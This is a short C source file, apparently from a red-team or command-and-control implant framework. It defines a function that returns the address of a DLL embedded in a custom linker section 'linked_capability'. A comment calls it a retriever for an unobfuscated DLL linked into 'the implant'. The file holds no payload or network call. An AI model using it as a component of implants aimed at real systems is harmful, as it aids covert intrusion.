#include <windows.h>

char __DLLDATA__[0] __attribute__((section("linked_capability")));

char *retrieve_dll() {
	// Basic retriever that simply fetches a plain (unobfuscated) DLL linked into the implant.

    return (char *)&__DLLDATA__;
}
